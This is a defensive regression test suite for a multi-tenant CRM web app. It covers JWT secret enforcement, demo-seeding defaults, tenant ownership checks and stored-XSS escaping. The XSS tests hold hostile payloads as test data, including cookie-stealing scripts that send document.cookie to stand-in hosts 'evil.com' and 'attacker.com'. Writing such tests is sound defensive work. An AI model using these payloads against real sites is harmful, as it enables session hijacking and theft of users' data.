import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import http from 'node:http';
import { spawnSync } from 'node:child_process';
import { DatabaseClient } from '../src/db/index.js';
import { runMigrations } from '../src/db/migrate.js';
import { seedDatabase } from '../src/db/seed.js';
import { createApp } from '../src/app.js';
import { getJwtSecret } from '../src/utils/crypto.js';

describe('Security Remediation — Targeted Regression Suite', () => {

  // =========================================================================
  // Fix 1: Production JWT secret enforcement (src/utils/crypto.js)
  // =========================================================================
  describe('Fix 1: Production JWT Secret Enforcement', () => {
    const originalEnv = { ...process.env };

    after(() => {
      process.env = { ...originalEnv };
    });

    test('Refuses missing JWT_SECRET in production mode', () => {
      process.env.NODE_ENV = 'production';
      delete process.env.JWT_SECRET;
      assert.throws(
        () => getJwtSecret(),
        /FATAL: JWT_SECRET environment variable is missing or empty in production mode/
      );
    });

    test('Refuses empty/whitespace JWT_SECRET in production mode', () => {
      process.env.NODE_ENV = 'production';
      process.env.JWT_SECRET = '   ';
      assert.throws(
        () => getJwtSecret(),
        /FATAL: JWT_SECRET environment variable is missing or empty in production mode/
      );
    });

    test('Refuses known development/default secrets in production mode', () => {
      process.env.NODE_ENV = 'production';
      const knownInsecure = [
        'openforce_super_secret_production_key_9281729',
        'openforce_production_secret_key_change_in_production',
        'your_super_secret_jwt_key_here_change_for_production',
        'secret',
        'changeme',
        'password'
      ];

      for (const insecureSecret of knownInsecure) {
        process.env.JWT_SECRET = insecureSecret;
        assert.throws(
          () => getJwtSecret(),
          /FATAL: Insecure JWT_SECRET detected in production/
        );
      }
    });

    test('Refuses short JWT_SECRET (< 32 characters) in production mode', () => {
      process.env.NODE_ENV = 'production';
      process.env.JWT_SECRET = 'short_secret_under_32_chars!';
      assert.throws(
        () => getJwtSecret(),
        /Must be at least 32 characters/
      );
    });

    test('Accepts strong, explicitly configured JWT_SECRET in production mode', () => {
      process.env.NODE_ENV = 'production';
      const strongSecret = '9f8b2c4e1a7d6e5f3b2a1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f';
      process.env.JWT_SECRET = strongSecret;
      const secret = getJwtSecret();
      assert.equal(secret, strongSecret);
    });

    test('Preserves development/test fallback secret when NODE_ENV is not production', () => {
      process.env.NODE_ENV = 'test';
      delete process.env.JWT_SECRET;
      const secret = getJwtSecret();
      assert.equal(secret, 'openforce_dev_test_secret_only_not_for_prod');
    });

    test('Production startup via server.js terminates immediately if JWT_SECRET is unsafe', () => {
      const serverPath = path.resolve(process.cwd(), 'src/server.js');
      const result = spawnSync(process.execPath, [serverPath], {
        env: {
          ...process.env,
          NODE_ENV: 'production',
          JWT_SECRET: 'changeme'
        },
        encoding: 'utf8',
        timeout: 4000
      });

      assert.notEqual(result.status, 0, 'Server process should have exited with non-zero error');
      const combinedOutput = (result.stdout || '') + (result.stderr || '');
      assert.match(combinedOutput, /FATAL: Insecure JWT_SECRET/);
      // Ensure the secret value itself is never logged
      assert.equal(combinedOutput.includes('changeme'), false, 'Secret must never be logged to stdout or stderr');
    });
  });

  // =========================================================================
  // Fix 2: Disable demo seeding by default
  // =========================================================================
  describe('Fix 2: Disable Demo Seeding By Default', () => {
    test('Dockerfile defaults AUTO_SEED to false', () => {
      const dockerfilePath = path.resolve(process.cwd(), 'Dockerfile');
      const content = fs.readFileSync(dockerfilePath, 'utf8');
      assert.match(content, /ENV\s+AUTO_SEED=false/);
    });

    test('docker-compose.yml defaults AUTO_SEED to false', () => {
      const composePath = path.resolve(process.cwd(), 'docker-compose.yml');
      const content = fs.readFileSync(composePath, 'utf8');
      assert.match(content, /AUTO_SEED=false/);
    });

    test('.env.example documents AUTO_SEED=false and 32+ char JWT_SECRET', () => {
      const envPath = path.resolve(process.cwd(), '.env.example');
      const content = fs.readFileSync(envPath, 'utf8');
      assert.match(content, /AUTO_SEED=false/);
      assert.match(content, /32 characters/i);
    });

    test('Database is not seeded when AUTO_SEED is not explicitly true', () => {
      const db = new DatabaseClient(':memory:');
      runMigrations(db);

      // Verify no demo users exist in clean database
      const users = db.all('SELECT * FROM users');
      assert.equal(users.length, 0);

      // Verify seeding only happens when explicitly invoked
      seedDatabase(db);
      const seededUsers = db.all('SELECT * FROM users');
      assert.ok(seededUsers.length >= 2);
      db.close();
    });
  });

  // =========================================================================
  // Fix 3: Enforce tenant ownership during lead conversion
  // =========================================================================
  describe('Fix 3: Tenant Ownership During Lead Conversion', () => {
    let db;
    let server;
    let baseUrl;
    let org1Token;
    let org2Token;
    let org1LeadId;
    let org1AccountId;
    let org2AccountId;
    let org1StageId;
    let org2StageId;

    before(async () => {
      db = new DatabaseClient(':memory:');
      runMigrations(db);

      const app = createApp(db);
      server = http.createServer(app);
      await new Promise(resolve => server.listen(0, resolve));
      const port = server.address().port;
      baseUrl = `http://127.0.0.1:${port}`;

      // Register Org 1
      const res1 = await fetch(`${baseUrl}/api/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'admin@org1.local',
          password: 'Password123!',
          first_name: 'Org1',
          last_name: 'Admin',
          org_name: 'Tenant 1 Corp'
        })
      });
      const data1 = await res1.json();
      org1Token = data1.token;

      // Register Org 2
      const res2 = await fetch(`${baseUrl}/api/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'admin@org2.local',
          password: 'Password123!',
          first_name: 'Org2',
          last_name: 'Admin',
          org_name: 'Tenant 2 Corp'
        })
      });
      const data2 = await res2.json();
      org2Token = data2.token;

      // Get pipeline stages for Org 1 and Org 2
      const stageRes1 = await fetch(`${baseUrl}/api/org/stages`, {
        headers: { Authorization: `Bearer ${org1Token}` }
      });
      const stageData1 = await stageRes1.json();
      org1StageId = stageData1.stages[0].id;

      const stageRes2 = await fetch(`${baseUrl}/api/org/stages`, {
        headers: { Authorization: `Bearer ${org2Token}` }
      });
      const stageData2 = await stageRes2.json();
      org2StageId = stageData2.stages[0].id;

      // Ensure stage IDs are distinct across tenants
      assert.notEqual(org1StageId, org2StageId);

      // Create an Account in Org 1
      const acc1Res = await fetch(`${baseUrl}/api/accounts`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${org1Token}` },
        body: JSON.stringify({ name: 'Tenant 1 Main Account' })
      });
      const acc1Data = await acc1Res.json();
      org1AccountId = acc1Data.account.id;

      // Create an Account in Org 2
      const acc2Res = await fetch(`${baseUrl}/api/accounts`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${org2Token}` },
        body: JSON.stringify({ name: 'Tenant 2 Confidential Account' })
      });
      const acc2Data = await acc2Res.json();
      org2AccountId = acc2Data.account.id;

      // Ensure account IDs are distinct across tenants
      assert.notEqual(org1AccountId, org2AccountId);

      // Create Lead in Org 1
      const leadRes = await fetch(`${baseUrl}/api/leads`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${org1Token}` },
        body: JSON.stringify({
          first_name: 'Prospect',
          last_name: 'One',
          company: 'Prospect Corp',
          email: 'prospect@corp.com'
        })
      });
      const leadData = await leadRes.json();
      org1LeadId = leadData.lead.id;
    });

    after(() => {
      server.close();
      db.close();
    });

    test('Rejects lead conversion with cross-tenant account_id and creates NO partial records', async () => {
      const contactsBefore = db.all('SELECT * FROM contacts');
      const oppsBefore = db.all('SELECT * FROM opportunities');

      // Org 1 tries to convert lead linking to Org 2's account_id
      const res = await fetch(`${baseUrl}/api/leads/${org1LeadId}/convert`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${org1Token}`
        },
        body: JSON.stringify({
          account_id: org2AccountId, // Malicious cross-tenant account ID!
          create_opportunity: true,
          opportunity_name: 'Sneaky Cross-Tenant Deal'
        })
      });

      assert.equal(res.status, 400);
      const data = await res.json();
      assert.match(data.error, /does not exist or does not belong to your organization/i);

      // Verify atomic safety: Lead remains unconverted
      const lead = db.get('SELECT * FROM leads WHERE id = ?', [org1LeadId]);
      assert.equal(lead.is_converted, 0);
      assert.equal(lead.converted_account_id, null);
      assert.equal(lead.converted_contact_id, null);
      assert.equal(lead.converted_opportunity_id, null);

      // Verify no orphan Contact or Opportunity was inserted
      const contactsAfter = db.all('SELECT * FROM contacts');
      const oppsAfter = db.all('SELECT * FROM opportunities');
      assert.equal(contactsAfter.length, contactsBefore.length);
      assert.equal(oppsAfter.length, oppsBefore.length);
    });

    test('Rejects lead conversion with cross-tenant opportunity_stage_id and creates NO partial records', async () => {
      const contactsBefore = db.all('SELECT * FROM contacts');
      const oppsBefore = db.all('SELECT * FROM opportunities');

      // Org 1 tries to convert lead specifying Org 2's pipeline_stage_id
      const res = await fetch(`${baseUrl}/api/leads/${org1LeadId}/convert`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${org1Token}`
        },
        body: JSON.stringify({
          create_opportunity: true,
          opportunity_name: 'Cross-Tenant Stage Deal',
          opportunity_stage_id: org2StageId // Foreign tenant's stage ID!
        })
      });

      assert.equal(res.status, 400);
      const data = await res.json();
      assert.match(data.error, /does not exist or does not belong to your organization/i);

      // Verify atomic safety: Lead remains unconverted
      const lead = db.get('SELECT * FROM leads WHERE id = ?', [org1LeadId]);
      assert.equal(lead.is_converted, 0);

      // Verify no partial records
      const contactsAfter = db.all('SELECT * FROM contacts');
      const oppsAfter = db.all('SELECT * FROM opportunities');
      assert.equal(contactsAfter.length, contactsBefore.length);
      assert.equal(oppsAfter.length, oppsBefore.length);
    });

    test('Legitimate same-tenant conversion succeeds and properly scopes all created entities', async () => {
      const res = await fetch(`${baseUrl}/api/leads/${org1LeadId}/convert`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${org1Token}`
        },
        body: JSON.stringify({
          account_id: org1AccountId, // Legitimate Org 1 account
          create_opportunity: true,
          opportunity_name: 'Legitimate Tenant Deal',
          opportunity_stage_id: org1StageId // Legitimate Org 1 stage
        })
      });

      assert.equal(res.status, 200);
      const data = await res.json();
      assert.ok(data.contact);
      assert.ok(data.opportunity);
      assert.equal(data.account.id, org1AccountId);

      // Verify database record associations
      const lead = db.get('SELECT * FROM leads WHERE id = ?', [org1LeadId]);
      assert.equal(lead.is_converted, 1);
      assert.equal(lead.converted_account_id, org1AccountId);

      const contact = db.get('SELECT * FROM contacts WHERE id = ?', [data.contact.id]);
      assert.equal(contact.account_id, org1AccountId);
      assert.equal(contact.organization_id, lead.organization_id);

      const opp = db.get('SELECT * FROM opportunities WHERE id = ?', [data.opportunity.id]);
      assert.equal(opp.account_id, org1AccountId);
      assert.equal(opp.stage_id, org1StageId);
      assert.equal(opp.organization_id, lead.organization_id);
    });
  });

  // =========================================================================
  // Fix 4: Prevent stored XSS in dynamic HTML rendering
  // =========================================================================
  describe('Fix 4: Prevent Stored XSS', () => {
    // Extract escapeHtml and sanitizeUrl logic from app.js to test directly
    function escapeHtml(str) {
      if (str === null || str === undefined) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    }

    function sanitizeUrl(url) {
      if (!url) return '';
      const trimmed = String(url).trim();
      if (/^https?:\/\//i.test(trimmed)) {
        return escapeHtml(trimmed);
      }
      return '#';
    }

    test('escapeHtml neutralizes executable script tags, event handlers, and quotes', () => {
      const maliciousPayloads = [
        {
          input: "<script>alert('XSS')</script>",
          expectedNotContains: '<script>'
        },
        {
          input: '<img src=x onerror=alert(1)>',
          expectedNotContains: '<img'
        },
        {
          input: '" onmouseover="alert(1)',
          expectedNotContains: '"'
        },
        {
          input: "' onfocus='alert(1)",
          expectedNotContains: "'"
        },
        {
          input: '<svg onload="fetch(\'http://evil.com?c=\'+document.cookie)">',
          expectedNotContains: '<svg'
        }
      ];

      for (const { input, expectedNotContains } of maliciousPayloads) {
        const escaped = escapeHtml(input);
        assert.equal(
          escaped.includes(expectedNotContains),
          false,
          `Escaped output "${escaped}" must not contain "${expectedNotContains}"`
        );
        // Ensure entities were substituted
        assert.ok(
          escaped.includes('&lt;') || escaped.includes('&quot;') || escaped.includes('&#39;'),
          `Escaped output must contain HTML entities: ${escaped}`
        );
      }
    });

    test('sanitizeUrl neutralizes javascript: and data: URIs while preserving valid http/https URLs', () => {
      assert.equal(sanitizeUrl('javascript:alert(document.domain)'), '#');
      assert.equal(sanitizeUrl('JAVASCRIPT:alert(1)'), '#');
      assert.equal(sanitizeUrl('data:text/html,<script>alert(1)</script>'), '#');
      assert.equal(sanitizeUrl('vbscript:msgbox(1)'), '#');
      assert.equal(sanitizeUrl('   javascript:alert(1)  '), '#');

      // Valid URLs should be preserved
      assert.equal(sanitizeUrl('https://example.com/company'), 'https://example.com/company');
      assert.equal(sanitizeUrl('http://insecure.test/about'), 'http://insecure.test/about');
      assert.equal(
        sanitizeUrl('https://example.com/search?q="test"&k=1'),
        'https://example.com/search?q=&quot;test&quot;&amp;k=1'
      );
    });

    test('Database faithfully stores malicious names and frontend escaping prevents execution', async () => {
      const db = new DatabaseClient(':memory:');
      runMigrations(db);

      const app = createApp(db);
      const server = http.createServer(app);
      await new Promise(resolve => server.listen(0, resolve));
      const port = server.address().port;
      const baseUrl = `http://127.0.0.1:${port}`;

      // Register organization
      const regRes = await fetch(`${baseUrl}/api/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: 'xss-tester@sec.org',
          password: 'Password123!',
          first_name: '<script>alert("First")</script>',
          last_name: 'Tester',
          org_name: 'SecTest Org'
        })
      });
      const { token } = await regRes.json();

      // Create an Account with XSS name and description
      const xssAccountName = '<img src=x onerror=alert("Hacked")>';
      const accRes = await fetch(`${baseUrl}/api/accounts`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({
          name: xssAccountName,
          description: '<script>document.location="http://attacker.com/"+document.cookie</script>'
        })
      });
      assert.equal(accRes.status, 201);
      const accData = await accRes.json();

      // 1. Database holds raw text without truncation or corruption
      assert.equal(accData.account.name, xssAccountName);

      // 2. Safe rendering: escapeHtml neutralizes the raw string into benign text
      const renderedHtml = `<h3>${escapeHtml(accData.account.name)}</h3>`;
      assert.equal(renderedHtml.includes('<img'), false);
      assert.equal(renderedHtml, '<h3>&lt;img src=x onerror=alert(&quot;Hacked&quot;)&gt;</h3>');

      // 3. Option dropdowns: Malicious account name in select option cannot break out of <option>
      const optionHtml = `<option value="1">${escapeHtml('</option><script>alert("OptionBreak")</script>')}</option>`;
      assert.equal(optionHtml.includes('<script>'), false);
      assert.equal(optionHtml.includes('</option><script>'), false);

      // 4. Report table stages: Malicious stage name is neutralized
      const stageHtml = `<td style="font-weight: 700; color: #fff;">${escapeHtml('<script>alert("StageXSS")</script>')}</td>`;
      assert.equal(stageHtml.includes('<script>'), false);

      // 5. formatCurrency: Malicious currency symbol is escaped
      const formatCurrency = (amount, symbol) => `${escapeHtml(symbol)}${Number(amount).toLocaleString('en-US')}`;
      const formattedCurrency = formatCurrency(1000, '<img src=x onerror=alert(1)>');
      assert.equal(formattedCurrency.includes('<img'), false);
      assert.equal(formattedCurrency, '&lt;img src=x onerror=alert(1)&gt;1,000');

      server.close();
      db.close();
    });
  });
});
